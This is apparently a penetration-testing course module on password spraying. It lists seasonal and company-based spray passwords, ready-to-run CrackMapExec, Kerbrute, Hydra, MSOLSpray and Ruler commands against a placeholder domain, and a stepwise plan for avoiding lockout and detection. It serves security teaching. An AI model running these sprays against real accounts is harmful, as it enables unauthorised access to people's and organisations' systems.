# Password Spraying

## Unit 4 - Topic 4 | Password Attacks

---

## Overview

**Password spraying** tries a small number of commonly used passwords against many accounts simultaneously. Unlike brute force (many passwords, one account), spraying avoids account lockout policies by staying below the lockout threshold.

---

## 1. How Spraying Works

```
BRUTE FORCE (Triggers Lockout):
Account: admin
├── Try: password1     ← Attempt 1
├── Try: password2     ← Attempt 2
├── Try: password3     ← Attempt 3
├── Try: password4     ← Attempt 4
└── Try: password5     ← LOCKED OUT! ❌ (5 attempts)

PASSWORD SPRAYING (Avoids Lockout):
Password: "Summer2024!"
├── Try: user1   ← 1 attempt per account
├── Try: user2   ← 1 attempt per account
├── Try: user3   ← 1 attempt per account
├── ...
└── Try: user500 ← 1 attempt per account
(Wait for lockout reset timer — e.g., 30 minutes)

Next password: "Welcome1!"
├── Try: user1   ← 2nd attempt (still under lockout threshold)
├── ...
└── Try: user500

RESULT: Test 3-5 passwords against 500 accounts safely!
```

---

## 2. Common Spray Passwords

```
TOP PASSWORDS FOR SPRAYING:

SEASONAL + YEAR:
├── Summer2024!
├── Winter2024!
├── Spring2024!
├── Fall2024!
└── Season + current year + ! (most common pattern)

COMPANY + VARIATIONS:
├── Target2024!
├── TargetCorp1!
├── Target@2024
└── Company name + year + special char

GENERIC COMMON:
├── Welcome1!
├── Password1!
├── Changeme1!
├── Monday1!
└── P@ssword1

MONTH + YEAR:
├── January2024!
├── March2024!
└── Current or recent months

BUILDING/CITY:
├── NewYork1!
├── Chicago2024!
└── Office location + number
```

---

## 3. Password Spraying Tools

```bash
# === CRACKMAPEXEC (Best for AD/SMB) ===
crackmapexec smb target.com -u users.txt -p "Summer2024!" --continue-on-success
crackmapexec smb target.com -u users.txt -p passwords.txt --no-bruteforce
# --no-bruteforce: spray mode (1 password at a time)

# === SPRAY (Kali Tool) ===
spray.sh -smb target.com users.txt passwords.txt 1 30
# 1 attempt, 30 min wait between passwords

# === KERBRUTE (Kerberos Spraying) ===
kerbrute passwordspray -d target.com users.txt "Summer2024!"
# Doesn't generate Windows logon events!
# Stealthier than SMB spraying

# === HYDRA (Generic Services) ===
hydra -L users.txt -p "Summer2024!" target.com ssh -t 4
# One password against all users

# === O365 SPRAYING ===
# MSOLSpray:
python3 MSOLSpray.py -u users.txt -p "Summer2024!" -t target.com
# Sprays against Microsoft 365 login

# === RULER (Exchange) ===
ruler --domain target.com brute --users users.txt --passwords passwords.txt
```

---

## 4. Spraying Strategy

```
SAFE SPRAYING PROCEDURE:

1. ENUMERATE USERS
   ├── LDAP query (if accessible)
   ├── Kerberos user enum (kerbrute)
   ├── OSINT (LinkedIn, email harvesting)
   └── SMB null session (enum4linux)

2. CHECK LOCKOUT POLICY
   ├── crackmapexec smb dc01 --pass-pol
   ├── Note: threshold (e.g., 5 attempts)
   ├── Note: observation window (e.g., 30 min)
   └── Stay 2 attempts BELOW threshold

3. SELECT PASSWORDS
   ├── Start with: Season+Year+!
   ├── Then: CompanyName+Year+!
   ├── Then: Welcome1!, Password1!
   └── Max 3-4 passwords per spray session

4. SPRAY AND WAIT
   ├── Try password 1 against all users
   ├── Wait for lockout timer reset
   ├── Try password 2 against all users
   └── Repeat

5. MONITOR
   ├── Watch for lockouts (stop immediately!)
   ├── Log all attempts
   └── Check for successful logins
```

---

## 5. Post-Spray Actions

| Spray Result | Next Step |
|-------------|-----------|
| **Valid credential found** | Test access: SMB shares, email, VPN |
| **Multiple valid creds** | Check for admin accounts among them |
| **No results** | Try different password patterns |
| **Lockouts occurring** | Stop! Increase wait time |
| **MFA prompt** | Note which accounts have MFA |

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **Spraying** | One password, many accounts |
| **Avoids lockout** | Stay below threshold |
| **Common passwords** | Season+Year+!, Company+Year+! |
| **CrackMapExec** | Best tool for AD spraying |
| **Kerbrute** | Stealth Kerberos spraying |
| **Strategy** | Enumerate → check policy → spray → wait |

---

## Quick Revision Questions

1. **How does password spraying differ from brute force?**
2. **What password patterns are most effective for spraying?**
3. **Why is Kerbrute stealthier than SMB spraying?**
4. **How do you determine safe spray timing?**
5. **What should you do if accounts start locking out?**

---

[← Previous: Dictionary Attacks](03-dictionary-attacks.md) | [Next: Credential Stuffing →](05-credential-stuffing.md)

---

*Unit 4 - Topic 4 of 7 | [Back to README](../README.md)*
